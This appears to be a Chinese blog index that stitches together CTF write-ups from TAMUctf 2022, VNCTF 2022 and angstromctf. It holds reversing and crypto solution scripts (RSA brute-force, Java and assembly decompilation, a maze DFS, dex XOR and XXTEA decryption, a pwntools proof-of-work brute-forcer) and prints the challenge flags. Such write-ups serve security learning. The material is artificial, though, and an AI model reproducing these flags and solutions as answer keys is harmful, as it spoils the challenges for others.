25342224089170333100306636803914920787189896347551816444387863311931649080923604315800499204237579498631810096631611071973123874056830102805021489922223497107987745847833710079309739908231834336962548381665274377394507547508429219479200092693502822925641820838339696968606391364116752304286396140315393313151, 11219660713789204202742696989216077354370568013452048147955373063444762584289531563384783613041048421333474174641298599132215025075661404347086073623827597677669183657195329521851165904770403553075208924844122371098662329185683345513780968553777905403400451650306775485483662325950970846860754141892029127917, 50500757958059566553948452213430677739062133399154230720526776946121679105666884743587180344391543571369500170810892276571666391607876552785346564660804897850738768097497754740736049331354148247545753252373564222927453167732844869576441864192773810563228412282917327450262466712149402999810508187299217077832, 13796177393828527291744511404416839769863259510413728685992376248599162441202291886439660675677653622901648405574058000123496322178999157790425090095832457176589064382002099304938815001660778620620528228883879875536592951049928308283418117379668761286572354085616852536841259829272184591287578895980689843232, 94353374555656679140432492892107777072224010951222839428792394552259349901419711075369544716435688802053471212467218767126427152075974695359186732893927279647288306899749863952520762661851437845697512463124069255934788006797785751896586752330563101877525452643958979838662446804754770114461350964612505415979, 75403769027329350048620079509960404012355117276850882699629857341112844373540933281523245700946105940872664118746361742614088673265525390243790774806272940237616738760424986011201067641954814019309748633751600764659128139503810407425513199105360353232273028636433129952154780253752026868651612197071477654436, 11219660713789204202742696989216077354370568013452048147955373063444762584289531563384783613041048421333474174641298599132215025075661404347086073623827597677669183657195329521851165904770403553075208924844122371098662329185683345513780968553777905403400451650306775485483662325950970846860754141892029127917, 132626448970956079864817158619972124077866198096038483761244821801251762948349253320315389306441383314870810646607706848421198329468403474363598378085192068048313691157122281578064651045742564142127919930992854999417980884496353697566372619597176562463683238483309005689504377616794496119531246611799864265667, 71172913413922329935704979207403580627225536795166420260725980069894246080693948091921089785863354903571127888879798538591171644685134274362332443155858850844647978416058522545267218109418365744589915489600473283739992336005065450027809122832659400353025763460136538927760513760032470665030322553524317349882, 139051834424787691049301940425084534822187931529013926536160702324482018355993996420233169577748099338600092666916418143391043318980547087119772370765825748591946164469050568118691659775385719962347326442442457009607621890207791156024683174801577222772673456164324766475796565471824420028882736280853171851210, 13796177393828527291744511404416839769863259510413728685992376248599162441202291886439660675677653622901648405574058000123496322178999157790425090095832457176589064382002099304938815001660778620620528228883879875536592951049928308283418117379668761286572354085616852536841259829272184591287578895980689843232, 13796177393828527291744511404416839769863259510413728685992376248599162441202291886439660675677653622901648405574058000123496322178999157790425090095832457176589064382002099304938815001660778620620528228883879875536592951049928308283418117379668761286572354085616852536841259829272184591287578895980689843232, 134752619714462687351938675521714746356213171731334621316047457372412420997884436167327770486316487173787538789339647763416762962633745005587016969211340594744711181749296753379714833676503693412716926903519765645254871337654447077737150451789441976908325540991854789258165643777934613328888504424141998253253]for i in range(len(cn)): for j in range(1,128): if (pow(j,e,N) == cn[i]): flag.append(j) a.append(i)for i in flag: print(chr(i),end = &quot;&quot;)# gigem{enumerable_SeArCh_SpAcEs_4R3_WEAK_0xBEEF} reverseCovfefe题目给出了.class文件，在网上下载jad，然后在当前目录中新建class和src文件夹，class文件夹中存放反汇编文件，运行以下代码后，src文件夹会自动生成逆向后的文件。 1jad -o -r -s java -d src class/**/*.class 鼠标右键查看源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.kpdus.com/jad.html// Decompiler options: packimports(3) // Source File Name: Covfefe.javapublic class Covfefe{ public Covfefe() { } public static void main(String args[]) { byte byte0 = 35; int ai[] = new int[byte0]; for(int i = 0; i &lt; byte0; i++) ai[i] = 0; ai[0] = 103; ai[1] = ai[0] + 2; ai[2] = ai[0]; for(int j = 3; j &lt; 8; j++) switch(j) { case 3: // '\\003' ai[j] = 101; break; case 4: // '\\004' ai[6] = 99; break; case 5: // '\\005' ai[5] = 123; break; case 6: // '\\006' ai[j + 1] = 48; break; case 7: // '\\007' ai[4] = 109; break; } ai[8] = 102; ai[9] = ai[8]; ai[24] = ai[25] = ai[28] = ai[7]; ai[10] = 51; ai[11] = (ai[10] + 12) - 4 - 4 - 4; ai[12] = ai[15] = ai[22] = ai[27] = ai[0] - (int)Math.pow(2D, 3D); ai[13] = 49; ai[14] = 115; for(int k = 16; k &lt; 22; k++) switch(k) { case 16: // '\\020' ai[k + 1] = 108; break; case 17: // '\\021' ai[k - 1] = 52; break; case 18: // '\\022' ai[k + 1] = 52; break; case 19: // '\\023' ai[k - 1] = 119; break; case 20: // '\\024' ai[k + 1] = 115; break; case 21: // '\\025' ai[k - 1] = 121; break; } ai[23] = 103; ai[26] = ai[23] - 3; ai[29] = ai[26] + 20; ai[30] = ai[29] % 53 + 53; ai[31] = ai[0] - 18; ai[32] = 80; ai[33] = 83; ai[byte0 - 1] = (int)Math.pow(5D, 3D); }} 写点python小代码： 12345678910111213141516171819202122232425262728293031323334ai = [0]*35ai[0] = 103;ai[1] = ai[0] + 2ai[2] = ai[0]ai[3] = 101ai[6] = 99ai[5] = 123ai[7] = 48ai[4] = 109ai[8] = 102ai[9] = ai[8]ai[24] = ai[25] = ai[28] = ai[7]ai[10] = 51;ai[11] = (ai[10] + 12) - 4 - 4 - 4ai[12] = ai[15] = ai[22] = ai[27] = ai[0] - pow(2, 3);ai[13] = 49ai[14] = 115ai[17] = 108ai[16] = 52ai[19] = 52ai[18] = 119ai[21] = 115ai[20] = 121ai[23] = 103;ai[26] = ai[23] - 3ai[29] = ai[26] + 20ai[30] = ai[29] % 53 + 53ai[31] = ai[0] - 18ai[32] = 80ai[33] = 83ai[34] = pow(5, 3)for i in ai: print(chr(i),end = &quot;&quot;)#gigem{c0ff33_1s_4lw4ys_g00d_0xCUPS} Existing Tooling (elf动调)文件在运行过程中就会产生flag,并且最后会输出长度。 动调obj数组即可 shift+e提取数据 1gigem{im_curious_did_you_statically_or_dynamically_reverse_ping_addison} Redo1 (C指针逆向)幸好前几天刚把C指针学完，不然就凉透了。 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define STR_LEN 34#define EXIT printf(&quot;Sorry that's not the flag\\n&quot;); return 1;#define SUCCESS printf(&quot;THAT'S THE FLAG!\\n&quot;); return 0;#define PARAMS printf(&quot;Usage: ./code &lt;flag&gt;\\n&quot;); return 1;#define POINTER char* flag = (char*)(&amp;a);int main(int argc, char** argv) { int a[] = {0x65676967,0x00000000,0x34427b6d,0x5f433153,0x616c5f43,0x00000000,0x4175476e,0x525f4567,0x00000000,0x78305f45,0x53414c47,0x00007d53}; if(argc != 2){ PARAMS } if(strlen(argv[1]) != STR_LEN){ EXIT } POINTER for(int i = 0; i &lt; STR_LEN; i++) { int idx = i; if(i &gt;= 4 &amp;&amp; i &lt;= 15){ idx += 4; } if(i &gt;= 16 &amp;&amp; i &lt;= 23){ idx += 8; } if(i &gt; 23){ idx += 12; } if(argv[1][i] != flag[idx]){ EXIT } } SUCCESS} argc是传入参数的个数，argv[]是传入的参数，参数长度需要等于34 被定义成char * 类型的指针flag，指向了从int * 类型转换成a数组，那么当flag指针++的时候，应当是+1（char类型的数据宽度为1），所以px遍历a数组，则是按照0x67-&gt;0x69-&gt;0x67-0x65的顺序遍历。 比赛的时候，题目都没看全，就试了试，flag就出来了，去掉数组a中的0x00000000，就可以了 1234567891011121314151617181920#include &lt;stdio.h&gt;int main(int argc,char** argv){ int a[] = {0x65676967,0x00000000,0x34427b6d,0x5f433153,0x616c5f43,0x00000000,0x4175476e,0x525f4567,0x00000000,0x78305f45,0x53414c47,0x00007d53}; char *px; px = (char*)a; char flag[50] = {0}; for(int i = 0;i&lt;48;i++) { flag[i] = *px; px++; } for(int i = 0;i&lt;48;i++){ printf(&quot;%c&quot;,flag[i]); } getchar(); return 0;}// gigem{B4S1C_C_lanGuAgE_RE_0xGLASS} Redo2 (gcc生成汇编代码)给我们整上了Intel的汇编，这题真的困扰了我很久，我头铁，还想着手动还原的，还画了堆栈图，没往生成汇编代码这块想……intel_syntax noprefixmain: lea ecx, [esp+4] and esp, -16 push DWORD PTR [ecx-4] push ebp mov ebp, esp push ebx push ecx sub esp, 32 mov ebx, ecx cmp DWORD PTR [ebx], 2 je .L2 mov eax, 1 jmp .L3.L2: mov DWORD PTR [ebp-12], 0 jmp .L4.L6: mov eax, DWORD PTR [ebx+4] add eax, 4 mov edx, DWORD PTR [eax] mov eax, DWORD PTR [ebp-12] add eax, edx movzx eax, BYTE PTR [eax] test al, al jne .L5 mov eax, 1 jmp .L3.L5: add DWORD PTR [ebp-12], 1.L4: cmp DWORD PTR [ebp-12], 28 jle .L6 sub esp, 12 push 29 call malloc add esp, 16 mov DWORD PTR [ebp-32], eax mov DWORD PTR [ebp-16], 0 jmp .L7.L8: mov eax, DWORD PTR [ebx+4] add eax, 4 mov edx, DWORD PTR [eax] mov eax, DWORD PTR [ebp-16] add eax, edx mov ecx, DWORD PTR [ebp-16] mov edx, DWORD PTR [ebp-32] add edx, ecx movzx eax, BYTE PTR [eax] mov BYTE PTR [edx], al mov edx, DWORD PTR [ebp-16] mov eax, DWORD PTR [ebp-32] add eax, edx movzx eax, BYTE PTR [eax] lea ecx, [eax-49] mov edx, DWORD PTR [ebp-16] mov eax, DWORD PTR [ebp-32] add eax, edx mov edx, ecx mov BYTE PTR [eax], dl add DWORD PTR [ebp-16], 1.L7: cmp DWORD PTR [ebp-16], 28 jle .L8 mov eax, DWORD PTR [ebp-32] movzx edx, BYTE PTR [eax] mov eax, DWORD PTR [ebp-32] add eax, 2 movzx eax, BYTE PTR [eax] cmp dl, al je .L9 mov eax, 1 jmp .L3.L9: mov eax, DWORD PTR [ebp-32] add eax, 1 movzx eax, BYTE PTR [eax] cmp al, 56 je .L10 mov eax, 1 jmp .L3.L10: mov eax, DWORD PTR [ebp-32] movzx eax, BYTE PTR [eax] cmp al, 54 je .L11 mov eax, 1 jmp .L3.L11: mov eax, DWORD PTR [ebp-32] add eax, 3 movzx eax, BYTE PTR [eax] cmp al, 52 je .L12 mov eax, 1 jmp .L3.L12: mov eax, DWORD PTR [ebp-32] add eax, 28 movzx eax, BYTE PTR [eax] movsx eax, al mov edx, DWORD PTR [ebp-32] add edx, 5 movzx edx, BYTE PTR [edx] movsx edx, dl add edx, 2 cmp eax, edx je .L13 mov eax, 1 jmp .L3.L13: mov eax, DWORD PTR [ebp-32] add eax, 5 movzx eax, BYTE PTR [eax] cmp al, 74 je .L14 mov eax, 1 jmp .L3.L14: mov eax, DWORD PTR [ebp-32] add eax, 4 movzx eax, BYTE PTR [eax] cmp al, 60 je .L15 mov eax, 1 jmp .L3.L15: mov DWORD PTR [ebp-20], 0 jmp .L16.L18: mov eax, DWORD PTR [ebp-20] lea edx, [eax+6] mov eax, DWORD PTR [ebp-32] add eax, edx movzx eax, BYTE PTR [eax] cmp al, 48 je .L17 mov eax, 1 jmp .L3.L17: add DWORD PTR [ebp-20], 1.L16: cmp DWORD PTR [ebp-20], 2 jle .L18 mov DWORD PTR [ebp-24], 0 jmp .L19.L21: mov eax, DWORD PTR [ebp-24] lea edx, [eax+10] mov eax, DWORD PTR [ebp-32] add eax, edx movzx eax, BYTE PTR [eax] cmp al, 49 je .L20 mov eax, 1 jmp .L3.L20: add DWORD PTR [ebp-24], 1.L19: cmp DWORD PTR [ebp-24], 3 jle .L21 mov DWORD PTR [ebp-28], 0 jmp .L22.L24: mov eax, DWORD PTR [ebp-28] lea edx, [eax+15] mov eax, DWORD PTR [ebp-32] add eax, edx movzx eax, BYTE PTR [eax] cmp al, 50 je .L23 mov eax, 1 jmp .L3.L23: add DWORD PTR [ebp-28], 1.L22: cmp DWORD PTR [ebp-28], 4 jle .L24 mov eax, DWORD PTR [ebp-32] add eax, 21 movzx eax, BYTE PTR [eax] movsx eax, al mov edx, DWORD PTR [ebp-32] add edx, 15 movzx edx, BYTE PTR [edx] movsx edx, dl add edx, 1 cmp eax, edx je .L25 mov eax, 1 jmp .L3.L25: mov eax, DWORD PTR [ebp-32] add eax, 9 movzx edx, BYTE PTR [eax] mov eax, DWORD PTR [ebp-32] add eax, 14 movzx eax, BYTE PTR [eax] cmp dl, al je .L26 mov eax, 1 jmp .L3.L26: mov eax, DWORD PTR [ebp-32] add eax, 9 movzx edx, BYTE PTR [eax] mov eax, DWORD PTR [ebp-32] add eax, 20 movzx eax, BYTE PTR [eax] cmp dl, al je .L27 mov eax, 1 jmp .L3.L27: mov eax, DWORD PTR [ebp-32] add eax, 9 movzx edx, BYTE PTR [eax] mov eax, DWORD PTR [ebp-32] add eax, 22 movzx eax, BYTE PTR [eax] cmp dl, al je .L28 mov eax, 1 jmp .L3.L28: mov eax, DWORD PTR [ebp-32] add eax, 9 movzx eax, BYTE PTR [eax] cmp al, 46 je .L29 mov eax, 1 jmp .L3.L29: mov eax, DWORD PTR [ebp-32] add eax, 27 movzx eax, BYTE PTR [eax] cmp al, 1 je .L30 mov eax, 1 jmp .L3.L30: mov eax, DWORD PTR [ebp-32] add eax, 26 movzx eax, BYTE PTR [eax] cmp al, 2 je .L31 mov eax, 1 jmp .L3.L31: mov eax, DWORD PTR [ebp-32] add eax, 23 movzx eax, BYTE PTR [eax] cmp al, 3 je .L32 mov eax, 1 jmp .L3.L32: mov eax, DWORD PTR [ebp-32] add eax, 24 movzx eax, BYTE PTR [eax] cmp al, 4 je .L33 mov eax, 1 jmp .L3.L33: mov eax, DWORD PTR [ebp-32] add eax, 25 movzx eax, BYTE PTR [eax] movsx eax, al.L3: lea esp, [ebp-8] pop ecx pop ebx pop ebp lea esp, [ecx-4] ret 需要在头部加上At&amp;t 语法，然后运行下面的代码： 1gcc -g -m32 -c redo2.s -o redo2 wp上使用的是Binary Ninja，我使用的是逆向界的瑞士军刀——IDA 注意输入的时候，v4所有元素都被减去了49，所以写脚本的时候需要加上： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071int __cdecl main(int argc, const char **argv, const char **envp){ _BYTE *v4; // [esp+0h] [ebp-20h] int n; // [esp+4h] [ebp-1Ch] int m; // [esp+8h] [ebp-18h] int k; // [esp+Ch] [ebp-14h] int j; // [esp+10h] [ebp-10h] int i; // [esp+14h] [ebp-Ch] if ( argc != 2 ) return 1; for ( i = 0; i &lt;= 28; ++i ) { if ( !argv[1][i] ) return 1; } v4 = malloc(0x1Du); for ( j = 0; j &lt;= 28; ++j ) { v4[j] = argv[1][j]; v4[j] -= 49; } if ( *v4 != v4[2] ) return 1; if ( v4[1] != 56 ) return 1; if ( *v4 != 54 ) return 1; if ( v4[3] != 52 ) return 1; if ( (char)v4[28] != (char)v4[5] + 2 ) return 1; if ( v4[5] != 74 ) return 1; if ( v4[4] != 60 ) return 1; for ( k = 0; k &lt;= 2; ++k ) { if ( v4[k + 6] != 48 ) return 1; } for ( m = 0; m &lt;= 3; ++m ) { if ( v4[m + 10] != 49 ) return 1; } for ( n = 0; n &lt;= 4; ++n ) { if ( v4[n + 15] != 50 ) return 1; } if ( (char)v4[21] != (char)v4[15] + 1 ) return 1; if ( v4[9] != v4[14] ) return 1; if ( v4[9] != v4[20] ) return 1; if ( v4[9] != v4[22] ) return 1; if ( v4[9] != 46 ) return 1; if ( v4[27] != 1 ) return 1; if ( v4[26] != 2 ) return 1; if ( v4[23] != 3 ) return 1; if ( v4[24] == 4 ) return (char)v4[25]; return 1;} 脚本： 123456789101112131415161718192021222324252627282930313233v4 = [0]*29v4[1] = 56v4[0] = 54v4[2] = v4[0]v4[3] = 52v4[5] = 74v4[28] = v4[5] + 2v4[4] = 60v4[6] = 48v4[7] = 48v4[8] = 48v4[10] = 49v4[11] = 49v4[12] = 49v4[13] = 49v4[15] = 50v4[16] = 50v4[17] = 50v4[18] = 50v4[19] = 50v4[21] = v4[15] + 1v4[9] = v4[14]v4[9] = v4[20]v4[9] = v4[22]v4[9] = 46v4[27] = 1v4[26] = 2v4[23] = 3v4[24] = 4v4[25] = 1for i in v4: print(chr(i+49),end = &quot;&quot;)# gigem{aaa_bbbb1ccccc1d145232}","link":"/2022/04/18/CTF/2022TAMUctf/"},{"title":"2022V&NCTF--赛后复现","text":"复现一下2022V&amp;NCTF Cryptoezmath生成数之后，挖了开头4位空，我们需要向服务端发送这4位，暴力求解 通过计算得知，把给出的数字*4，即可求出n 先了解一下pwntools的用法： https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/intro.html 连接上服务端，然后接受服务端发送的数据 123from pwn import *r =remote('node4.buuoj.cn',27061) #端口不固定d = r.recvline() 从服务端发送的数据中截取所需的字符， 12s = d[16:32] enc = d[37:101] #当然也有更好的方法 在本地进行sha256暴力破解 1234567891011121314def check(s,enc): table = '0123456789abcdefghijklmnopqrstuvwxyz' + 'abcdefghijklmnopqrstuvwxyz'.upper() ans='' for i in table: for j in table: for k in table: for l in table: a = i + j + k + l + s if sha256(a.encode()).hexdigest() == enc: ans+=a[:4] print(ans) return (ans)tmp=check(s,enc)r.sendline(tmp) 将得出的四位字符发送给服务端，服务段返回，一共循环777次才能满足 1context.log_level = 'debug' 在开头加上以上的代码就能得到下面的形式 参考文档：https://lu1u.xyz/2022/02/12/VNCTF2022/ 百感交集，查看源代码请参考上面的链接（同样的代码为什么在我电脑上出错） flag{068f36ec-cbdb-4840-b069-039bee388b2a} ReverseBabyMaze 迷宫 下载下来的文件只是一个3k的pyc文件，而且是python3.8版本的。一开始我用的是网页的pyc解码，发现根本不支持。然后我用的是uncompyle6解码，还是不支持。最后我用的是pycdc，将其转换成了字节码。 当初看的关于pycdc的参考链接： http://www.syjblog.com/?p=470 1./pycdas path of pyc file 当初用的手算的，虽然解出来，但是太麻烦了…… 最好用dfs（深度优先搜索算法）来解这道题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667map = [[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,1, 1, 1, 1], [1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,0, 0, 0, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1,1, 1, 1, 1, 1, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0,0, 1, 0, 1, 0, 0, 0, 1, 0, 1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1,1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1,1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1], [1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0,0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1,0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 0, 0, 1, 0, 1,0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 1, 1, 1, 1, 1, 1,0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [1, 0, 0, 0, 0,0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 0, 1,1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1], [1,0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0,1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1,1, 1, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 1], [1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1,1, 0, 1, 1, 1, 0, 1], [1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0,0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0,1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1], [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0,1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1,1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0,0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1,1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0,1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0,1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0,1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1,1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [1, 0,0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1],[1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,0, 1], [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,0, 0, 0, 1], [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,1, 1, 1, 1, 1, 1]]usedmap = [[0 for i in range(len(map))] for i in range(len(map)) ] #创建对应的状态标志列表flag = ''direction = [[0,1],[1,0],[0,-1],[-1,0]] #设置四个方向的单次变化值signs = ['d','s','a','w'] #设置对应方向的名称def DFS(x, y , step): global flag if x == 29 and y == 29: #设置终点 print(&quot;path:&quot;) print(flag) print(&quot;steps:&quot;) print(step) return for k in range(4): tx = x+direction[k][0] #下一个位置的横坐标 ty = y+direction[k][1] ##下一个位置的纵坐标 if tx &lt; 1 or tx &gt; 30 or ty &lt; 1 or ty &gt; 30: continue if map[tx][ty] == 0 and usedmap[tx][ty] == 0: usedmap[x][y] = 1 #探索过，则状态标志列表对应坐标置1 flag += signs[k] DFS(tx,ty,step+1) flag = flag[:-1] #回溯，则flag最后一位清除 usedmap[x][y] = 0 #回溯，则状态标志列表对应坐标置0x = 1y = 1DFS(x, y ,0) 自己修改了一些代码，使其更简洁。用下面的图就能很好理解这段代码了，先定义一个地图列表，再定义一个使用空间列表。 搜索的方向为顺时针，且搜索的条件为下一个位置每次搜索成功，都会使对应坐标状态标志置1。如果其中一个分支没有成功到达，则回溯，回溯到最近的一个分支且分支后的状态标志都置为0 其中一个小知识点就是，在函数中使用全局变量时，需要使用global关键字，其作用是显式的告诉解释器flag为全局变量，否则解释器会认为flag为局部变量，从而报错。 查看官方文档后才发现这个题还有我没发现的盲点 没有用uncompyle6反汇编成功，是因为有==花指令==！！！ 这边看一下 1234567import marshal, disf = open(&quot;BabyMaze.pyc&quot;, &quot;rb&quot;).read()code = marshal.loads(f[16:])#这边从16位开始取因为是python3 python2从8位开始取dis.dis(code) 开头三个字节在不停的跳，这就是花指令了 下面的是我不加code = marshal.loads(f[16:])这个语句的输出结果，开头多出了23行的东西…… cm1 (安卓逆向)昨天看这一题看的心态崩了，今天务必要把它复现出来。 发现这题用jadx有问题，参观大佬博客才发现用的都是GDA，下面是关于GDA的介绍：https://zhuanlan.zhihu.com/p/28354064 什么事dex文件？ https://www.cnblogs.com/zhaoyanjun/p/5736305.html 所以说.dex很重要，如果题目中出现dex文件，则必须要注重查看。 跟进这个copyFiles函数 123456obyteArray = bytearray(open(r&quot;ooo&quot;, &quot;rb&quot;).read())bBytes = b&quot;vn2022&quot;for i in range(len(obyteArray)): vi5 = i % 1024 obyteArray[i] = ((obyteArray[i] ^ bBytes[(vi5 % len(bBytes))]) &amp; 0x00ff)open(r&quot;classes.dex&quot;, &quot;wb&quot;).write(obyteArray) 大佬的博客传送门：https://blog.shi1011.cn/ctf/2162 ooo文件是data文件，用more查看一下，emmm 也就是从ooo文件读取的数据与ooo进行异或操作等，转化成dex文件 下面是大佬z1r0写的代码 123456789101112bBytes = b'vn2022'with open(&quot;ooo&quot;, &quot;rb&quot;) as f: flag = f.read() #print(flag)with open('output.dex', 'wb') as f: obyteArray = bytearray(open(r&quot;ooo&quot;, &quot;rb&quot;).read()) for i in range(len(flag)): vi5 = i % 1024 obyteArray[i] = (obyteArray[i] ^ bBytes[(vi5 % len(bBytes))]) &amp; 0x00ff f.write(obyteArray) 在linux里，把out.dex放在dex2jar以下目录中 运行以下命令，转化为jar 把jar文件放到windows中，用jd-gui分析，加密算法出来了 可以看出此为xxtea算法。最核心的是要明白：XXTEA算法使用128bit的密钥对以32bit为单位的信息块进行加密。 H4pPY_VNCTF！！OvO为秘钥，给我们的字符一共16位，一位8bit，16*8=128bit。 而arrayofbyte1数组则是需要加密的信息，==不太懂为什么是11位==，一共44个数字，4个数字拼成一个32bit的信息块？ 123456from struct import unpacka = [68, 39, -92, 108, -82, -18, 72, -55, 74, -56, 38, 11, 60, 84, 97, -40, 87, 71, 99, -82, 120, 104, 47, -71, -58, -57, 0, 33, 42, 38, -44, -39, -60, 113, -2, 92, -75, 118, -77, 50, -121, 43, 32, -106]bytes = bytes(i % 256 for i in a)print(bytes, len(bytes))print(unpack(&quot;&lt;11L&quot;,bytes))print(unpack(&quot;&lt;4L&quot;, b&quot;H4pPY_VNCTF!!OvO&quot;)) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;windows.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); }}int main() { uint32_t key[4] = {1349530696, 1314283353, 558257219, 1333153569}; uint32_t v[12] = {1822697284, 3377000110, 187091018, 3630257212, 2925741911, 3106891896, 553699270, 3654559274, 1560179140, 850622133, 2518690695, 0}; btea(v, -11, key); printf(&quot;%s&quot;, (char*)v); return 0;} btea函数，一参v是加密的组元的起始地址，二参11则是需要加密的组元个数，负数位解密，三参则是秘钥的起始地址 VNCTF{93ee7688-f216-42cb-a5c2-191ff4e412ba}","link":"/2022/02/14/CTF/2022V&NCTF/"},{"title":"2022angstromctf","text":"复现一下2022angstromctf Crypto[复现]Vinegar Factory123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/local/bin/python3import stringimport osimport randomalpha = string.ascii_lowercasedef encrypt(msg, key): ret = &quot;&quot; i = 0 for c in msg: if c in alpha: ret += alpha[(alpha.index(key[i]) + alpha.index(c)) % len(alpha)] i = (i + 1) % len(key) else: ret += c return retinner = alpha + &quot;_&quot;noise = inner + &quot;{}&quot;print(&quot;Welcome to the vinegar factory! Solve some crypto, it'll be fun I swear!&quot;)i = 0while True: if i % 50 == 49: fleg = flag else: fleg = &quot;actf{&quot; + &quot;&quot;.join(random.choices(inner, k=random.randint(10, 50))) + 